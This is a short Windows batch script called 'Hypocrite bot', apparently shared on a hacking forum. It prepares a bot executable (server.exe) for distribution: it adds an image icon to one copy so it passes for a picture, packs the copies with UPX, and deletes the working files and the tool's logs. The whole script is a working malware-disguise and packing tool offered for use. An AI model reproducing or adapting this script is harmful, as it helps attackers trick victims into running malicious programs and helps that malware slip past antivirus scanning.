@echo off
color 2f




echo --------------------------------
echo Hypocrite bot
echo Created by: MRUBERNUB
echo --------------------------------
echo This tool will:
echo - Compress the file
echo - Create a copy with and "image" icon
echo - Create a copy with NO icon (And packed)
echo - Create a copy of the orgianl file
echo - These files will be stored in the "Bot" Folder
echo -----------------------------------------------------------------
echo www.hackforums.net
echo -----------------------------------------------------------------
ping localhost -n 5 > nul


del Bot\*.exe > nul
rmdir Bot > nul
ping localhost -n 3 > nul

mkdir BOT


echo compressing bot...

echo Cloning bot...
copy server.exe Bot_Compressed.exe > nul
copy server.exe Bot\Bot_NotEdited.exe > nul

echo Editing bot...

Tools\Hack -addoverwrite Bot_Compressed.exe, server.exe, Tools\Icon_1.ico, icon, 1,


echo Copying new bot(s)

copy server.exe Bot\server.exe > nul
copy bot_compressed.exe Bot\Bot_Compressed.exe > nul

echo Deleting old bots...
del server.exe 
del bot_Compressed.exe 
echo Deleting logs...
del Tools\hack.ini 
del Tools\hack.log 
echo Compressing bot(s)...
Tools\UPX -9 Bot\Bot_Compressed.exe > nul
Tools\UPX -9 Bot\server.exe > nul


echo ------------------------------------------
Echo The bot was created.
echo ------------------------------------------
ping localhost -n 5 > nul
cls
color 07
